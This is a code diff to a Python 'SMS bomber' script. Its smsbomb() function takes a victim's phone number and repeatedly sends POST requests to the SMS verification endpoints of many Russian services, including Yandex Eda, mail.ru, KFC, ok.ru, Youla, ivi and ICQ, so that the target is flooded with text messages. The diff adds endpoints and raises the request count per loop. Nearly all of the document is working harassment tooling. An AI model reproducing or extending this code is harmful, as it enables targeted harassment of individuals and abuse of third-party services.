@@ -35,7 +35,7 @@ banner = f"""
 
 def smsbomb():
     clear()
-    print(f'{Fore.RED} [{Fore.GREEN}-{Fore.RED}] NOTE: DO NOT TYPE + WITH THE COUNTRY CODE! ALSO, 1 LOOP IS EQUAL TO 7 MESSAGES!')
+    print(f'{Fore.RED} [{Fore.GREEN}-{Fore.RED}] NOTE: DO NOT TYPE + WITH THE COUNTRY CODE! ALSO, 1 LOOP IS EQUAL TO 15 REQUESTS!')
     print(Fore.RESET)
 
     cc = int(input(f' {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.GREEN} Country code:{Fore.MAGENTA} '))
@@ -48,7 +48,7 @@ def smsbomb():
     for i in range(tm):
         cn = cn + 1
         try:
-            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + fp})
+            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": f'+{fp}'})
             print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
 
         except:
@@ -99,6 +99,78 @@ def smsbomb():
         cn = cn + 1
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + fp, "api": 2, "email": "email", "x-email": "x-email"})
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": fn})
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': f"+{fn}"}, headers=HEADERS)
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": f'+{fn}'})
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":f'+{fn}'})
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": f'+{fn}'})
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7})
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": fn, "SignupForm[device_type]": 3})
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': fn, "locale": 'en', 'countryCode': cc,'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+
+        except:
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            
+        cn = cn + 1
+        try:
+            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': ph, "locale": 'en', 'countryCode': cc,'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
